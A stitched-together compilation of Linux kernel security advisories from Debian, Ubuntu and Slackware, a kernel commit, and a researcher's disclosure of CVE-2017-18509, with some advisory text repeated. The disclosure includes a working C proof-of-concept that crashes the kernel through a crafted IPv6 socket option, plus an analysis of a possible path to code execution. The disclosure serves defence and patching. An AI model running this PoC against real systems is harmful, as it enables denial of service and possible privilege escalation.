Commit [5e1859f](https://github.com/torvalds/linux/commit/5e1859fbcc3ccdd56d528df91d7b6f70e73d6b82) ("ipv4: ipmr: various fixes and cleanups") fixed
the issue for ipv4 ipmr:

  ip_mroute_setsockopt() & ip_mroute_getsockopt() should not
  access/set raw_sk(sk)->ipmr_table before making sure the socket
  is a raw socket, and protocol is IGMP

The same fix should be done for ipv6 ipmr as well.

This patch can fix the panic caused by overwriting the same offset
as ipmr_table as in raw_sk(sk) when accessing other type's socket
by ip_mroute_setsockopt().

Package        : linux
Version        : 3.16.72-1
CVE ID         : CVE-2017-18509 CVE-2018-20836 CVE-2019-1125 CVE-2019-3900
                 CVE-2019-10207 CVE-2019-10638 CVE-2019-13631 CVE-2019-14283
                 CVE-2019-14284

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2017-18509

    Denis Andzakovic reported a missing type check in the IPv4 multicast
    routing implementation. A user with the CAP_NET_ADMIN capability (in
    any user namespace) could use this for denial-of-service (memory
    corruption or crash) or possibly for privilege escalation.

CVE-2018-20836

    chenxiang reported a race condition in libsas, the kernel
    subsystem supporting Serial Attached SCSI (SAS) devices, which
    could lead to a use-after-free.  It is not clear how this might be
    exploited.

CVE-2019-1125

    It was discovered that most x86 processors could speculatively
    skip a conditional SWAPGS instruction used when entering the
    kernel from user mode, and/or could speculatively execute it when
    it should be skipped.  This is a subtype of Spectre variant 1,
    which could allow local users to obtain sensitive information from
    the kernel or other processes.  It has been mitigated by using
    memory barriers to limit speculative execution.  Systems using an
    i386 kernel are not affected as the kernel does not use SWAPGS.

CVE-2019-3900

    It was discovered that vhost drivers did not properly control the
    amount of work done to service requests from guest VMs.  A
    malicious guest could use this to cause a denial-of-service
    (unbounded CPU usage) on the host.

CVE-2019-10207

    The syzkaller tool found a potential null dereference in various
    drivers for UART-attached Bluetooth adapters.  A local user with
    access to a pty device or other suitable tty device could use this
    for denial-of-service (BUG/oops).

CVE-2019-10638

    Amit Klein and Benny Pinkas discovered that the generation of IP
    packet IDs used a weak hash function, "jhash".  This could enable
    tracking individual computers as they communicate with different
    remote servers and from different networks.  The "siphash"
    function is now used instead.

CVE-2019-13631

    It was discovered that the gtco driver for USB input tablets could
    overrun a stack buffer with constant data while parsing the device's
    descriptor.  A physically present user with a specially
    constructed USB device could use this to cause a denial-of-service
    (BUG/oops), or possibly for privilege escalation.

CVE-2019-14283

    The syzkaller tool found a missing bounds check in the floppy disk
    driver.  A local user with access to a floppy disk device, with a
    disk present, could use this to read kernel memory beyond the
    I/O buffer, possibly obtaining sensitive information.

CVE-2019-14284

    The syzkaller tool found a potential division-by-zero in the
    floppy disk driver.  A local user with access to a floppy disk
    device could use this for denial-of-service (oops).

(CVE ID not yet assigned)

    Denis Andzakovic reported a possible use-after-free in the
    TCP sockets implementation.  A local user could use this for
    denial-of-service (memory corruption or crash) or possibly
    for privilege escalation.

(CVE ID not yet assigned)

    The netfilter conntrack subsystem used kernel addresses as
    user-visible IDs, which could make it easier to exploit other
    security vulnerabilities.

XSA-300

    Julien Grall reported that Linux does not limit the amount of memory
    which a domain will attempt to balloon out, nor limits the amount of
    "foreign / grant map" memory which any individual guest can consume,
    leading to denial of service conditions (for host or guests).

For Debian 8 "Jessie", these problems have been fixed in version
3.16.72-1.

We recommend that you upgrade your linux packages.

Aug 13 2019

By setting a specific socket option, an attacker can control a pointer in kernel land and cause a general protection fault, or potentially execute arbitrary code. The issue can be triggered by running the included POC as root, inside a default LXC container or with `CAP_NET_ADMIN` privileges. This issue was confirmed on Debian Stretch (kernel 4.9.168), however Debian have advised that this issue also affects older kernel versions. This issue may also be triggered by a low privileged user that can unshare their user and network namespaces.

**Date Released:** 13/08/2019

**Author:** Denis Andzakovic

**Vendor Website:** <https://www.debian.org/>

**Affected Software:** Linux Kernel 4.9.168 - Linux Kernel < 4.11

**CVE:** CVE-2017-18509

## inet\_csk\_listen\_stop GPF

The crash occurs in the `inet_csk_listen_stop` function, and can be triggered by running the following POC. The POC code needs to be run as root, from within a default configured LXC container or given `CAP_NET_ADMIN` privileges. Alternatively, a low privileged user with the ability the unshare their user namespace may use `unshare -Urn ./poc` and trigger the crash.

Note this vulnerability appears to be the same issue disclosed to Openwall on December 2017, but never addressed (<https://lists.openwall.net/netdev/2017/12/04/40>)

### Proof-of-concept

The following proof-of-concept can be used to replicate the issue

```
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdint.h>
#include <unistd.h>

int main(){
        uint32_t opt = 99999999;
        int sock = socket(AF_INET6, SOCK_STREAM, 0);
        listen(sock, 0);
        setsockopt(sock, IPPROTO_IPV6, 0xd1, &opt, 4);
        close(sock); // boom
        return 0;
}

```

### Potential path to code execution

This issue may be used to execute arbitrary code, provided an attacker can control the `req` pointer in `./net/ipv4/inet_connection_sock.c:877`. However, the bug is limited in that it will not crash with an attacker controlled value greater than `0x5F5E0FF`. If the attacker can control memory and bypass protections at an address lower than `0x5F5E0FF`, then execution of arbitrary code may be plausible. This requires elevated privileges and should get caught by existing kernel exploit mitigations, so practical exploitation is likely limited. The following figures detail the potential exploit path:

The attacker controls `req` below (`net/ipv4/inet_connection_sock.c`):

```
while (req != NULL) {
			next = req->dl_next;
			reqsk_put(req);
			req = next;
}

```

The attacker controlled pointer is passed to `reqsk_put` (`net/request_sock.h`):

```
static inline void reqsk_put(struct request_sock *req)
{
	if (atomic_dec_and_test(&req->rsk_refcnt))
		reqsk_free(req);
}

```

Attacker controlled function is then called at `req->rsk_ops->destructor` (`net/request_sock.h`):

```
static inline void reqsk_free(struct request_sock *req)
{
	/* temporary debugging */
	WARN_ON_ONCE(atomic_read(&req->rsk_refcnt) != 0);

	req->rsk_ops->destructor(req);
	if (req->rsk_listener)
		sock_put(req->rsk_listener);
	kfree(req->saved_syn);
	kmem_cache_free(req->rsk_ops->slab, req);
}

```

                 CVE-2019-14283 CVE-2019-14284

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2015-8553

    Jan Beulich discovered that CVE-2015-2150 was not completely
    addressed.  If a PCI physical function is passed through to a
    Xen guest, the guest is able to access its memory and I/O
    regions before enabling decoding of those regions.  This could
    result in a denial-of-service (unexpected NMI) on the host.

    The fix for this is incompatible with qemu versions before 2.5.

(CVE ID not yet assigned)

    Denis Andzakovic reported a missing type check in the IPv4 multicast
    routing implementation. A user with the CAP_NET_ADMIN capability (in
    any user namespace) could use this for denial-of-service (memory
    corruption or crash) or possibly for privilege escalation.

CVE-2018-5995

    ADLab of VenusTech discovered that the kernel logged the virtual
    addresses assigned to per-CPU data, which could make it easier to
    exploit other vulnerabilities.

CVE-2018-20836

    chenxiang reported a race condition in libsas, the kernel
    subsystem supporting Serial Attached SCSI (SAS) devices, which
    could lead to a use-after-free.  It is not clear how this might be
    exploited.

CVE-2018-20856

    Xiao Jin reported a potential double-free in the block subsystem,
    in case an error occurs while initialising the I/O scheduler for a
    block device.  It is not clear how this might be exploited.

CVE-2019-1125

    It was discovered that most x86 processors could speculatively
    skip a conditional SWAPGS instruction used when entering the
    kernel from user mode, and/or could speculatively execute it when
    it should be skipped.  This is a subtype of Spectre variant 1,
    which could allow local users to obtain sensitive information from
    the kernel or other processes.  It has been mitigated by using
    memory barriers to limit speculative execution.  Systems using an
    i386 kernel are not affected as the kernel does not use SWAPGS.

CVE-2019-3882

    It was found that the vfio implementation did not limit the number
    of DMA mappings to device memory.  A local user granted ownership
    of a vfio device could use this to cause a denial of service
    (out-of-memory condition).

CVE-2019-3900

    It was discovered that vhost drivers did not properly control the
    amount of work done to service requests from guest VMs.  A
    malicious guest could use this to cause a denial-of-service
    (unbounded CPU usage) on the host.

CVE-2019-10207

    The syzkaller tool found a potential null dereference in various
    drivers for UART-attached Bluetooth adapters.  A local user with
    access to a pty device or other suitable tty device could use this
    for denial-of-service (BUG/oops).

CVE-2019-10638

    Amit Klein and Benny Pinkas discovered that the generation of IP
    packet IDs used a weak hash function, "jhash".  This could enable
    tracking individual computers as they communicate with different
    remote servers and from different networks.  The "siphash"
    function is now used instead.

CVE-2019-10639

    Amit Klein and Benny Pinkas discovered that the generation of IP
    packet IDs used a weak hash function that incorporated a kernel
    virtual address.  This hash function is no longer used for IP IDs,
    although it is still used for other purposes in the network stack.

CVE-2019-13631

    It was discovered that the gtco driver for USB input tablets could
    overrun a stack buffer with constant data while parsing the device's
    descriptor.  A physically present user with a specially
    constructed USB device could use this to cause a denial-of-service
    (BUG/oops), or possibly for privilege escalation.

CVE-2019-13648

    Praveen Pandey reported that on PowerPC (ppc64el) systems without
    Transactional Memory (TM), the kernel would still attempt to
    restore TM state passed to the sigreturn() system call.  A local
    user could use this for denial-of-service (oops).

CVE-2019-14283

    The syzkaller tool found a missing bounds check in the floppy disk
    driver.  A local user with access to a floppy disk device, with a
    disk present, could use this to read kernel memory beyond the
    I/O buffer, possibly obtaining sensitive information.

CVE-2019-14284

    The syzkaller tool found a potential division-by-zero in the
    floppy disk driver.  A local user with access to a floppy disk
    device could use this for denial-of-service (oops).

(CVE ID not yet assigned)

    Denis Andzakovic reported a possible use-after-free in the
    TCP sockets implementation.  A local user could use this for
    denial-of-service (memory corruption or crash) or possibly
    for privilege escalation.

(CVE ID not yet assigned)

    The netfilter conntrack subsystem used kernel addresses as
    user-visible IDs, which could make it easier to exploit other
    security vulnerabilities.

XSA-300

    Julien Grall reported that Linux does not limit the amount of memory
    which a domain will attempt to baloon out, nor limits the amount of
    "foreign / grant map" memory which any individual guest can consume,
    leading to denial of service conditions (for host or guests).

For the oldstable distribution (stretch), these problems have been fixed
in version 4.9.168-1+deb9u5.

For the stable distribution (buster), these problems were mostly fixed
in version 4.19.37-5+deb10u2 or earlier.

We recommend that you upgrade your linux packages.

Installation instructions:
+------------------------+

Upgrade the packages as root:
# upgradepkg kernel-*.txz

If you are using an initrd, you'll need to rebuild it.

For a 32-bit SMP machine, use this command (substitute the appropriate
kernel version if you are not running Slackware 14.2):
# /usr/share/mkinitrd/mkinitrd_command_generator.sh -k 4.4.189-smp | bash

For a 64-bit machine, or a 32-bit uniprocessor machine, use this command
(substitute the appropriate kernel version if you are not running
Slackware 14.2):
# /usr/share/mkinitrd/mkinitrd_command_generator.sh -k 4.4.189 | bash

Please note that "uniprocessor" has to do with the kernel you are running,
not with the CPU. Most systems should run the SMP kernel (if they can)
regardless of the number of cores the CPU has. If you aren't sure which
kernel you are running, run "uname -a". If you see SMP there, you are
running the SMP kernel and should use the 4.4.189-smp version when running
mkinitrd_command_generator. Note that this is only for 32-bit -- 64-bit
systems should always use 4.4.189 as the version.

If you are using lilo or elilo to boot the machine, you'll need to ensure
that the machine is properly prepared before rebooting.

If using LILO:
By default, lilo.conf contains an image= line that references a symlink
that always points to the correct kernel. No editing should be required
unless your machine uses a custom lilo.conf. If that is the case, be sure
that the image= line references the correct kernel file.  Either way,
you'll need to run "lilo" as root to reinstall the boot loader.

If using elilo:
Ensure that the /boot/vmlinuz symlink is pointing to the kernel you wish
to use, and then run eliloconfig to update the EFI System Partition.

                 CVE-2019-14283 CVE-2019-14284

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2017-18509

    Denis Andzakovic reported a missing type check in the IPv4 multicast
    routing implementation. A user with the CAP_NET_ADMIN capability (in
    any user namespace) could use this for denial-of-service (memory
    corruption or crash) or possibly for privilege escalation.

CVE-2018-5995

    ADLab of VenusTech discovered that the kernel logged the virtual
    addresses assigned to per-CPU data, which could make it easier to
    exploit other vulnerabilities.

CVE-2018-20836

    chenxiang reported a race condition in libsas, the kernel
    subsystem supporting Serial Attached SCSI (SAS) devices, which
    could lead to a use-after-free.  It is not clear how this might be
    exploited.

CVE-2018-20856

    Xiao Jin reported a potential double-free in the block subsystem,
    in case an error occurs while initialising the I/O scheduler for a
    block device.  It is not clear how this might be exploited.

CVE-2019-1125

    It was discovered that most x86 processors could speculatively
    skip a conditional SWAPGS instruction used when entering the
    kernel from user mode, and/or could speculatively execute it when
    it should be skipped.  This is a subtype of Spectre variant 1,
    which could allow local users to obtain sensitive information from
    the kernel or other processes.  It has been mitigated by using
    memory barriers to limit speculative execution.  Systems using an
    i386 kernel are not affected as the kernel does not use SWAPGS.

CVE-2019-3882

    It was found that the vfio implementation did not limit the number
    of DMA mappings to device memory.  A local user granted ownership
    of a vfio device could use this to cause a denial of service
    (out-of-memory condition).

CVE-2019-3900

    It was discovered that vhost drivers did not properly control the
    amount of work done to service requests from guest VMs.  A
    malicious guest could use this to cause a denial-of-service
    (unbounded CPU usage) on the host.

CVE-2019-10207

    The syzkaller tool found a potential null dereference in various
    drivers for UART-attached Bluetooth adapters.  A local user with
    access to a pty device or other suitable tty device could use this
    for denial-of-service (BUG/oops).

CVE-2019-10638

    Amit Klein and Benny Pinkas discovered that the generation of IP
    packet IDs used a weak hash function, "jhash".  This could enable
    tracking individual computers as they communicate with different
    remote servers and from different networks.  The "siphash"
    function is now used instead.

CVE-2019-10639

    Amit Klein and Benny Pinkas discovered that the generation of IP
    packet IDs used a weak hash function that incorporated a kernel
    virtual address.  This hash function is no longer used for IP IDs,
    although it is still used for other purposes in the network stack.

CVE-2019-13631

    It was discovered that the gtco driver for USB input tablets could
    overrun a stack buffer with constant data while parsing the device's
    descriptor.  A physically present user with a specially
    constructed USB device could use this to cause a denial-of-service
    (BUG/oops), or possibly for privilege escalation.

CVE-2019-13648

    Praveen Pandey reported that on PowerPC (ppc64el) systems without
    Transactional Memory (TM), the kernel would still attempt to
    restore TM state passed to the sigreturn() system call.  A local
    user could use this for denial-of-service (oops).

CVE-2019-14283

    The syzkaller tool found a missing bounds check in the floppy disk
    driver.  A local user with access to a floppy disk device, with a
    disk present, could use this to read kernel memory beyond the
    I/O buffer, possibly obtaining sensitive information.

CVE-2019-14284

    The syzkaller tool found a potential division-by-zero in the
    floppy disk driver.  A local user with access to a floppy disk
    device could use this for denial-of-service (oops).

(CVE ID not yet assigned)

    Denis Andzakovic reported a possible use-after-free in the
    TCP sockets implementation.  A local user could use this for
    denial-of-service (memory corruption or crash) or possibly
    for privilege escalation.

(CVE ID not yet assigned)

    The netfilter conntrack subsystem used kernel addresses as
    user-visible IDs, which could make it easier to exploit other
    security vulnerabilities.

XSA-300

    Julien Grall reported that Linux does not limit the amount of memory
    which a domain will attempt to baloon out, nor limits the amount of
    "foreign / grant map" memory which any individual guest can consume,
    leading to denial of service conditions (for host or guests).

For Debian 8 "Jessie", these problems have been fixed in version
4.9.168-1+deb9u5~deb8u1.

We recommend that you upgrade your linux-4.9 packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be

## Details

It was discovered that a race condition existed in the GFS2 file system in

the Linux kernel. A local attacker could possibly use this to cause a

denial of service (system crash). ([CVE-2016-10905](/security/CVE-2016-10905))

It was discovered that the IPv6 implementation in the Linux kernel did not

properly validate socket options in some situations. A local attacker could

use this to cause a denial of service (system crash) or possibly execute

arbitrary code. ([CVE-2017-18509](/security/CVE-2017-18509))

It was discovered that the USB gadget Midi driver in the Linux kernel

contained a double-free vulnerability when handling certain error

conditions. A local attacker could use this to cause a denial of service

(system crash). ([CVE-2018-20961](/security/CVE-2018-20961))

It was discovered that the XFS file system in the Linux kernel did not

properly handle mount failures in some situations. A local attacker could

possibly use this to cause a denial of service (system crash) or execute

arbitrary code. ([CVE-2018-20976](/security/CVE-2018-20976))

It was discovered that the Intel Wi-Fi device driver in the Linux kernel

did not properly validate certain Tunneled Direct Link Setup (TDLS). A

physically proximate attacker could use this to cause a denial of service

(Wi-Fi disconnect). ([CVE-2019-0136](/security/CVE-2019-0136))

It was discovered that the Bluetooth UART implementation in the Linux

kernel did not properly check for missing tty operations. A local attacker

could use this to cause a denial of service. ([CVE-2019-10207](/security/CVE-2019-10207))

It was discovered that an integer overflow existed in the Linux kernel when

reference counting pages, leading to potential use-after-free issues. A

local attacker could use this to cause a denial of service (system crash)

or possibly execute arbitrary code. ([CVE-2019-11487](/security/CVE-2019-11487))

It was discovered that the GTCO tablet input driver in the Linux kernel did

not properly bounds check the initial HID report sent by the device. A

physically proximate attacker could use this to cause a denial of service

(system crash) or possibly execute arbitrary code. ([CVE-2019-13631](/security/CVE-2019-13631))

It was discovered that the Raremono AM/FM/SW radio device driver in the

Linux kernel did not properly allocate memory, leading to a use-after-free.

A physically proximate attacker could use this to cause a denial of service

or possibly execute arbitrary code. ([CVE-2019-15211](/security/CVE-2019-15211))

It was discovered that a race condition existed in the CPiA2 video4linux

device driver for the Linux kernel, leading to a use-after-free. A

physically proximate attacker could use this to cause a denial of service

(system crash) or possibly execute arbitrary code. ([CVE-2019-15215](/security/CVE-2019-15215))

It was discovered that the Atheros mobile chipset driver in the Linux

kernel did not properly validate data in some situations. An attacker could

use this to cause a denial of service (system crash). ([CVE-2019-15926](/security/CVE-2019-15926))

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

ipv6: check sk sk\_type and protocol early in ip\_mroute\_set/getsockoptCommit 5e1859fbcc3c ("ipv4: ipmr: various fixes and cleanups") fixed
the issue for ipv4 ipmr:
ip\_mroute\_setsockopt() & ip\_mroute\_getsockopt() should not
access/set raw\_sk(sk)->ipmr\_table before making sure the socket
is a raw socket, and protocol is IGMP
The same fix should be done for ipv6 ipmr as well.
This patch can fix the panic caused by overwriting the same offset
as ipmr\_table as in raw\_sk(sk) when accessing other type's socket
by ip\_mroute\_setsockopt().
